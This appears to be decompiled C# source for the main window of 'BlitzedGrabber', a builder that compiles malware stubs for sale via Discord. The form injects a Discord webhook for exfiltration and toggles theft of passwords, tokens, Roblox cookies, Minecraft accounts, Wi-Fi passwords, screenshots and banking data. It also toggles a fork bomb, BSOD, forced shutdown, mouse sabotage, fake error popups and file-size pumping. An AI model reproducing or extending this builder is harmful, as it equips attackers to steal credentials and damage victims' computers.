using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using BlitzedGrabber.Properties;
using MetroFramework;
using MetroFramework.Controls;
using MetroFramework.Forms;
using Microsoft.CSharp;

namespace BlitzedGrabber
{
	// Token: 0x0200001E RID: 30
	public partial class Form1 : MetroForm
	{
		// Token: 0x0600006D RID: 109
		[DllImport("user32.dll")]
		public static extern bool SwapMouseButton(bool fSwap);

		// Token: 0x0600006E RID: 110 RVA: 0x00005468 File Offset: 0x00003668
		[Obsolete]
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600006F RID: 111 RVA: 0x00005478 File Offset: 0x00003678
		private void Form1_Load(object sender, EventArgs e)
		{
			if (!new WebClient().DownloadString("https://raw.githubusercontent.com/StvnedEagle1337/Stuff/main/BlitzedGrabber/FreeTrial.cs").Contains("True"))
			{
				MessageBox.Show("Trial Version has ended. Buy for 10$ on the discord Server! Note: Stubs that u have made will still work!");
				Environment.Exit(0);
				Process.GetCurrentProcess().Kill();
				Process.GetCurrentProcess().Kill();
				Process.GetCurrentProcess().Kill();
				Application.Exit();
				base.Close();
				Thread.Sleep(323232);
				Thread.Sleep(323232);
				Thread.Sleep(323232);
				Thread.Sleep(232323232);
				Thread.Sleep(232323232);
				Thread.Sleep(232323232);
				Thread.Sleep(232323232);
			}
			this.metroTabControl2.SelectedTab = this.metroTabControl2.SelectedTab;
			if (Program.GetValue("Webhook") != null)
			{
				this.webhookTextBox.Text = Program.GetValue("Webhook");
			}
			if (Program.GetValue("FileName") != null)
			{
				this.fileNameTextBox.Text = Program.GetValue("FileName");
			}
			if (Program.GetValue("TopMost") != null)
			{
				string TopMost = Program.GetValue("TopMost");
				this.TopMostCheckBox.Checked = Convert.ToBoolean(TopMost);
				base.TopMost = Convert.ToBoolean(TopMost);
			}
		}

		// Token: 0x06000070 RID: 112 RVA: 0x000055B0 File Offset: 0x000037B0
		public void ExecuteCommandSync(object command)
		{
			try
			{
				ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + ((command != null) ? command.ToString() : null));
				procStartInfo.RedirectStandardOutput = true;
				procStartInfo.UseShellExecute = false;
				procStartInfo.CreateNoWindow = true;
				Process process = new Process();
				process.StartInfo = procStartInfo;
				process.Start();
				Console.WriteLine(process.StandardOutput.ReadToEnd());
			}
			catch
			{
			}
		}

		// Token: 0x06000071 RID: 113 RVA: 0x0000562C File Offset: 0x0000382C
		[Obsolete]
		public void CompileStub()
		{
			this.compilerOutputTextBox.Text = "";
			ICodeCompiler icc = new CSharpCodeProvider(new Dictionary<string, string> { { "CompilerVersion", "v4.0" } }).CreateCompiler();
			string output = this.fileNameTextBox.Text + ".exe";
			MetroTextBox metroTextBox = this.compilerOutputTextBox;
			metroTextBox.Text += "Creating Parameters";
			CompilerParameters parameters = new CompilerParameters();
			parameters.GenerateExecutable = true;
			parameters.OutputAssembly = output;
			MetroTextBox metroTextBox2 = this.compilerOutputTextBox;
			metroTextBox2.Text = metroTextBox2.Text + Environment.NewLine + "Adding References";
			parameters.ReferencedAssemblies.Add("System.dll");
			parameters.ReferencedAssemblies.Add("System.Drawing.dll");
			parameters.ReferencedAssemblies.Add("System.Net.Http.dll");
			parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
			parameters.ReferencedAssemblies.Add("System.Core.dll");
			parameters.ReferencedAssemblies.Add("System.Security.dll");
			parameters.ReferencedAssemblies.Add("netstandard.dll");
			parameters.ReferencedAssemblies.Add("System.ObjectModel.dll");
			parameters.ReferencedAssemblies.Add("System.Management.dll");
			parameters.ReferencedAssemblies.Add("APIFOR.dll");
			parameters.TreatWarningsAsErrors = false;
			string code = Resources.Program;
			string basewebhook = Base64.Base64Encode(this.webhookTextBox.Text);
			if (!string.IsNullOrEmpty(this.iconPathTextBox.Text))
			{
				MetroTextBox metroTextBox3 = this.compilerOutputTextBox;
				metroTextBox3.Text = metroTextBox3.Text + Environment.NewLine + "Adding Icon";
				parameters.CompilerOptions = string.Format("/target:winexe /win32icon:{0}", this.iconPathTextBox.Text);
			}
			if (string.IsNullOrEmpty(this.webhookTextBox.Text))
			{
				MessageBox.Show("You need to put a webhook in the webhook textbox lol");
				this.metroTabControl2.SelectedTab = this.optionsTab;
				return;
			}
			code = code.Replace("//INSERT_WEBHOOK//", basewebhook);
			MetroTextBox metroTextBox4 = this.compilerOutputTextBox;
			metroTextBox4.Text = metroTextBox4.Text + Environment.NewLine + "Checking Features";
			if (this.fakeErrorCheckBox.Checked)
			{
				code = code.Replace("//FAKETEXTBOXERROR//", string.Concat(new string[]
				{
					"FakeError(\"",
					this.errorMessageTextBox.Text,
					"\",\"",
					this.errorTitleTextBox.Text,
					"\");"
				}));
			}
			if (this.FreezeMouseCheckBox.Checked)
			{
				code = code.Replace("//FREEZEMOUSE//", this.FreezeMouseCheckBox.Checked.ToString().ToLower() + ";");
				code = code.Replace("//FREEZEMOUSELENGTH//", this.FreezeMouseSeconds.Text + ";");
			}
			else
			{
				code = code.Replace("//FREEZEMOUSE//", this.FreezeMouseCheckBox.Checked.ToString().ToLower() + ";");
				code = code.Replace("//FREEZEMOUSELENGTH//", "0;");
			}
			MetroTextBox metroTextBox5 = this.compilerOutputTextBox;
			metroTextBox5.Text = metroTextBox5.Text + Environment.NewLine + "Applying Features";
			code = code.Replace("//CRASHDISCORDD//", this.CrashDiscordCheckBox.Checked.ToString().ToLower() + ";");
			code = code.Replace("//GETPASSWORDS//", this.passwordcheckbox.Checked.ToString().ToLower() + ";");
			code = code.Replace("//PCSTEAlA//", this.pcinfocheckbox.Checked.ToString().ToLower() + ";");
			code = code.Replace("//ROBLOXCOOKIESTEAL//", this.rbxcookiecheckbox.Checked.ToString().ToLower() + ";");
			code = code.Replace("//CAPTURESCREEN//", this.PCScreenShotCheckbox.Checked.ToString().ToLower() + ";");
			code = code.Replace("//GATHERTOKENS//", this.tokensCheckBox.Checked.ToString().ToLower() + ";");
			code = code.Replace("//STEALMINECRAFT//", this.MinecraftCheckBox.Checked.ToString().ToLower() + ";");
			code = code.Replace("//TAKEWIFIPASSWORDS//", this.WIFIPasswordsCheckBox.Checked.ToString().ToLower() + ";");
			code = code.Replace("//DEBUGMODE//", this.DebugModeCheckBox.Checked.ToString().ToLower() + ";");
			code = code.Replace("//SWAPMOUSE//", this.SwapMouseCheckBox.Checked.ToString().ToLower() + ";");
			MetroTextBox metroTextBox6 = this.compilerOutputTextBox;
			metroTextBox6.Text = metroTextBox6.Text + Environment.NewLine + "Applying Malicious Selected Options";
			code = code.Replace("//FORKBOMBER//", this.ForkBombCheckBox.Checked.ToString().ToLower() + ";");
			code = code.Replace("//RESTARTYESORNO//", this.restartpccheckbox.Checked.ToString().ToLower() + ";");
			code = code.Replace("//SHUTDOWNPC//", this.shutdownpccheckbox.Checked.ToString().ToLower() + ";");
			code = code.Replace("//DOBSOD//", this.bsodcheckbox.Checked.ToString().ToLower() + ";");
			MetroTextBox metroTextBox7 = this.compilerOutputTextBox;
			metroTextBox7.Text = metroTextBox7.Text + Environment.NewLine + "Gathering Sources...";
			string[] source = new string[]
			{
				code,
				Resources.Rich,
				Resources.Devil,
				Resources.ErrorHandling,
				Resources.Grabbing,
				Resources.aesgem,
				Resources.Counter,
				Resources.SQLite,
				Resources.SQLReader,
				Resources.cbcrypt,
				Resources.IniFile,
				Resources.Wifi,
				Resources.Crypto,
				Resources.StringsCrypt,
				Resources.Paths,
				Resources.CommandHelper,
				Resources.Handler,
				Resources.Banking,
				Resources.Minecraft
			};
			CompilerResults results = icc.CompileAssemblyFromSourceBatch(parameters, source);
			if (this.filePumperCheckBox.Checked)
			{
				MetroTextBox metroTextBox8 = this.compilerOutputTextBox;
				metroTextBox8.Text = metroTextBox8.Text + Environment.NewLine + "Pumping EXE...";
				if (this.kiloByteCheckBox.Checked)
				{
					if (Regex.IsMatch(this.pumpAmountTextBox.Text, "^[a-zA-Z]+$"))
					{
						MessageBox.Show("Invalid File Pump Amount", "Error Compiling");
					}
					FileStream file = File.OpenWrite(this.fileNameTextBox.Text + ".exe");
					long siz = file.Seek(0L, SeekOrigin.End);
					decimal bite = Convert.ToInt64(this.pumpAmountTextBox.Text) * 1024L;
					while (siz < bite)
					{
						siz += 1L;
						file.WriteByte(0);
					}
					file.Close();
				}
				else if (this.megaByteCheckBox.Checked)
				{
					if (Regex.IsMatch(this.pumpAmountTextBox.Text, "^[a-zA-Z]+$"))
					{
						MessageBox.Show("Invalid File Pump Amount", "Error Compiling");
					}
					FileStream file2 = File.OpenWrite(this.fileNameTextBox.Text + ".exe");
					long siz2 = file2.Seek(0L, SeekOrigin.End);
					decimal bite2 = Convert.ToInt64(this.pumpAmountTextBox.Text) * 1024L * 1024L;
					while (siz2 < bite2)
					{
						siz2 += 1L;
						file2.WriteByte(0);
					}
					file2.Close();
				}
				else if (this.GigaByteCheckbox.Checked)
				{
					if (Regex.IsMatch(this.pumpAmountTextBox.Text, "^[a-zA-Z]+$"))
					{
						MessageBox.Show("Invalid File Pump Amount", "Error Compiling");
					}
					FileStream file3 = File.OpenWrite(this.fileNameTextBox.Text + ".exe");
					long siz3 = file3.Seek(0L, SeekOrigin.End);
					decimal bite3 = Convert.ToInt64(this.pumpAmountTextBox.Text) * 1024L * 1024L * 1024L;
					while (siz3 < bite3)
					{
						siz3 += 1L;
						file3.WriteByte(0);
					}
					file3.Close();
				}
			}
			if (results.Errors.Count > 0)
			{
				foreach (object obj in results.Errors)
				{
					CompilerError CompErr = (CompilerError)obj;
					this.compilerOutputTextBox.Text = string.Concat(new string[]
					{
						this.compilerOutputTextBox.Text,
						Environment.NewLine,
						CompErr.FileName,
						Environment.NewLine,
						"Line number ",
						CompErr.Line.ToString(),
						", Error Number: ",
						CompErr.ErrorNumber,
						", '",
						CompErr.ErrorText,
						";"
					});
				}
				this.compilerOutputTextBox.Text = this.compilerOutputTextBox.Text + Environment.NewLine + "An error has occured when trying to compile file.";
				return;
			}
			this.compilerOutputTextBox.Text = string.Concat(new string[]
			{
				this.compilerOutputTextBox.Text,
				Environment.NewLine,
				"Successfully compiled stub!",
				Environment.NewLine,
				"Enjoy!"
			});
		}

		// Token: 0x06000072 RID: 114 RVA: 0x00006074 File Offset: 0x00004274
		private void groupBox1_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x06000073 RID: 115 RVA: 0x00006076 File Offset: 0x00004276
		private void addButton_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000074 RID: 116 RVA: 0x00006078 File Offset: 0x00004278
		private void robloxCheckBox_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000075 RID: 117 RVA: 0x0000607A File Offset: 0x0000427A
		private void cookiesCheckBox_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000076 RID: 118 RVA: 0x0000607C File Offset: 0x0000427C
		private void passwordsCheckBox_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000077 RID: 119 RVA: 0x00006080 File Offset: 0x00004280
		[Obsolete]
		private void compileButton_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.fileNameTextBox.Text))
			{
				this.fileNameTextBox.Text = "stub";
			}
			Program.SetValue("Webhook", this.webhookTextBox.Text);
			Program.SetValue("FileName", this.fileNameTextBox.Text);
			Form1.filenameyuh = this.fileNameTextBox.Text + ".exe";
			this.CompileStub();
		}

		// Token: 0x06000078 RID: 120 RVA: 0x000060F9 File Offset: 0x000042F9
		private void metroCheckBox10_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000079 RID: 121 RVA: 0x000060FB File Offset: 0x000042FB
		private void iconCheckBox_CheckedChanged_1(object sender, EventArgs e)
		{
			if (this.iconCheckBox.Checked)
			{
				this.chooseIconButton.Enabled = true;
				return;
			}
			this.chooseIconButton.Enabled = false;
		}

		// Token: 0x0600007A RID: 122 RVA: 0x00006124 File Offset: 0x00004324
		private void metroButton4_Click(object sender, EventArgs e)
		{
			if (this.fileNameTextBox.Text == "")
			{
				MessageBox.Show("File Name Is Empty, Will Cause Errors");
				return;
			}
			if (this.fileNameTextBox.Text.Length > 260)
			{
				MessageBox.Show("File Name Is Too Long, Will Cause Errors");
				return;
			}
			if (this.fileNameTextBox.Text.Contains("//") | this.fileNameTextBox.Text.Contains("\\"))
			{
				MessageBox.Show("File Name Has Invalid Characters, Will Cause Errors");
				return;
			}
			if (this.fileNameTextBox.Text.Contains("<") | this.fileNameTextBox.Text.Contains(">"))
			{
				MessageBox.Show("File Name Has Invalid Characters, Will Cause Errors");
				return;
			}
			MessageBox.Show("File Name Is Good");
		}

		// Token: 0x0600007B RID: 123 RVA: 0x000061F4 File Offset: 0x000043F4
		private void metroTabControl2_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600007C RID: 124 RVA: 0x000061F6 File Offset: 0x000043F6
		private void testWebhookButton_Click_1(object sender, EventArgs e)
		{
			new WebhookFunctions().sendwebhook(this.webhookTextBox.Text, "This webhooks working!", "Blitzed Grabber");
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00006218 File Offset: 0x00004418
		private void chooseIconButton_Click_1(object sender, EventArgs e)
		{
			using (OpenFileDialog x = new OpenFileDialog())
			{
				x.Filter = "ico file (*.ico)|*.ico";
				if (x.ShowDialog() == DialogResult.OK)
				{
					this.iconPathTextBox.Text = x.FileName;
					this.iconPictureBox.BackgroundImage = Image.FromFile(x.FileName);
					this.iconPictureBox.BackgroundImageLayout = ImageLayout.Stretch;
				}
				else
				{
					this.iconPathTextBox.Text = "";
				}
			}
		}

		// Token: 0x0600007E RID: 126 RVA: 0x000062A0 File Offset: 0x000044A0
		private void filePumperCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			if (this.filePumperCheckBox.Checked)
			{
				this.pumpAmountTextBox.Enabled = this.filePumperCheckBox.Checked;
				this.kiloByteCheckBox.Enabled = this.filePumperCheckBox.Checked;
				this.megaByteCheckBox.Enabled = this.filePumperCheckBox.Checked;
				this.GigaByteCheckbox.Enabled = this.filePumperCheckBox.Checked;
				return;
			}
			this.pumpAmountTextBox.Enabled = this.filePumperCheckBox.Checked;
			this.kiloByteCheckBox.Enabled = this.filePumperCheckBox.Checked;
			this.megaByteCheckBox.Enabled = this.filePumperCheckBox.Checked;
			this.GigaByteCheckbox.Enabled = this.filePumperCheckBox.Checked;
		}

		// Token: 0x0600007F RID: 127 RVA: 0x0000636B File Offset: 0x0000456B
		private void metroCheckBox6_CheckedChanged(object sender, EventArgs e)
		{
			if (this.TopMostCheckBox.Checked)
			{
				base.TopMost = true;
				Program.SetValue("TopMost", "true");
				return;
			}
			base.TopMost = false;
			Program.SetValue("TopMost", "false");
		}

		// Token: 0x06000080 RID: 128 RVA: 0x000063A7 File Offset: 0x000045A7
		private void kiloByteCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			this.megaByteCheckBox.Checked = false;
			this.GigaByteCheckbox.Checked = false;
			this.kiloByteCheckBox.Checked = this.kiloByteCheckBox.Checked;
		}

		// Token: 0x06000081 RID: 129 RVA: 0x000063D7 File Offset: 0x000045D7
		private void GigaByteCheckbox_CheckedChanged(object sender, EventArgs e)
		{
			this.megaByteCheckBox.Checked = false;
			this.kiloByteCheckBox.Checked = false;
			this.GigaByteCheckbox.Checked = this.GigaByteCheckbox.Checked;
		}

		// Token: 0x06000082 RID: 130 RVA: 0x00006407 File Offset: 0x00004607
		private void megaByteCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			this.GigaByteCheckbox.Checked = false;
			this.kiloByteCheckBox.Checked = false;
			this.megaByteCheckBox.Checked = this.megaByteCheckBox.Checked;
		}

		// Token: 0x06000083 RID: 131 RVA: 0x00006437 File Offset: 0x00004637
		private void fileNameTextBox_KeyDown(object sender, KeyEventArgs e)
		{
			if (e.KeyCode == Keys.Return)
			{
				this.CompileStub();
			}
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00006449 File Offset: 0x00004649
		private void fakeErrorCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			this.errorMessageTextBox.Enabled = this.fakeErrorCheckBox.Checked;
			this.errorTitleTextBox.Enabled = this.fakeErrorCheckBox.Checked;
		}

		// Token: 0x06000085 RID: 133 RVA: 0x00006477 File Offset: 0x00004677
		private void groupBox4_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00006479 File Offset: 0x00004679
		private void FreezeMouseCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			if (this.FreezeMouseCheckBox.Checked)
			{
				this.FreezeMouseSeconds.Enabled = true;
				this.FreezeMouseSeconds.ReadOnly = false;
				return;
			}
			this.FreezeMouseSeconds.Enabled = false;
			this.FreezeMouseSeconds.ReadOnly = true;
		}

		// Token: 0x06000087 RID: 135 RVA: 0x000064B9 File Offset: 0x000046B9
		private void RecoverMouseButtons_Click(object sender, EventArgs e)
		{
			Form1.SwapMouseButton(false);
		}

		// Token: 0x06000088 RID: 136 RVA: 0x000064C4 File Offset: 0x000046C4
		private void JoinDiscordButton_Click(object sender, EventArgs e)
		{
			using (WebClient client = new WebClient())
			{
				Process.Start(client.DownloadString("https://raw.githubusercontent.com/StvnedEagle1337/Stuff/main/BlitzedGrabber/Discord.txt"));
			}
		}

		// Token: 0x06000089 RID: 137 RVA: 0x00006504 File Offset: 0x00004704
		private void metroButton1_Click(object sender, EventArgs e)
		{
			Process.Start("https://github.com/StvnedEagle1337");
		}

		// Token: 0x0600008A RID: 138 RVA: 0x00006511 File Offset: 0x00004711
		private void JoinTelegramButton_Click(object sender, EventArgs e)
		{
			Process.Start("https://github.com/StvnedEagle1337");
		}

		// Token: 0x04000020 RID: 32
		public static string currentDir = Directory.GetCurrentDirectory();

		// Token: 0x04000021 RID: 33
		public static string filenameyuh = "";

		// Token: 0x04000022 RID: 34
		public static string tempFolder = Environment.GetEnvironmentVariable("TEMP");

		// Token: 0x04000023 RID: 35
		public static string strExeFilePath = AppDomain.CurrentDomain.BaseDirectory;
	}
}
